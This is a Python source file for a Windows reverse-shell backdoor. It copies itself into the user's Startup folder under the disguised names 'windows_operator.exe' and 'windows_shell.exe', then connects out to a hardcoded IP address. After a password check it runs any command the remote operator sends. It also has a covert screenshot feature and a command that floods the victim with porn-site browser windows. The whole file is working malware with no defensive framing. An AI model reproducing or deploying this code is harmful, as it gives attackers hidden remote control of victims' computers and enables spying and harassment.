import os
import socket
import subprocess
import time
import getpass
host = "80.210.76.214"
port = 21
password = 'n0tm1ne'


fromdir = os.getcwd()+'\\windows_operator.exe'
todir = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_operator.exe'.format(getpass.getuser())

firstname = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_operator.exe'.format(getpass.getuser())
secondname = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_shell.exe'.format(getpass.getuser())

try:
    mv = os.rename(fromdir, todir)
except:
    pass

try:
    rf = os.rename(firstname, secondname)
except:
    pass

def passwd():
    thetry = ''
    while password != thetry:
        s.send('password pleas:'.encode('utf-8'))
        thetry = str(s.recv(1024).decode('utf-8')[:-1:])
        if thetry == password:
            shell()
        else:
            s.send('try again \n'.encode('utf-8'))


def shell():
    while True:
        s.send('\n'.encode('utf-8') + os.getcwd().encode('utf-8') + '>>'.encode('utf-8'))
        command = str(s.recv(1024).decode('utf-8')[:-1:])       # [:1:] cutter \n af
        if len(command) > 0:
            if command[:8] == 'shutdown':
                s.send('Just reconnect if you want. But bye for now \n'.encode('utf-8'))
                s.close()
                break

            elif 'stopnow' in command:
                s.send('Bye \n'.encode('utf-8'))
                quit()

            elif command[:5] == 'blast':
                blastcnt = 0
                while blastcnt != 32:
                    blast = 'explorer http://pornhub.com'
                    subprocess.Popen(blast, shell=True)
                    blastcnt += 1
                
            elif 'cd' in command and len(command) > 0:
                try:
                    os.chdir(command.split(' ')[1])
                except Exception as e:
                    s.send(str(e).encode('utf-8'))
            elif 'screenshot' in command:
                takepic = 'screencapture screenshot.jpg'
                subprocess.Popen(takepic, shell=True)
                # todo faa den til at sende til attacker og slet efter
                # men ind til videre er det en god maade at tage screenshots paa uden nogen ved det
            else:
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output = cmd.stdout.read()+cmd.stderr.read()
                s.send(output)
        else:
            continue


while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception:
        continue
    passwd()
    time.sleep(3)
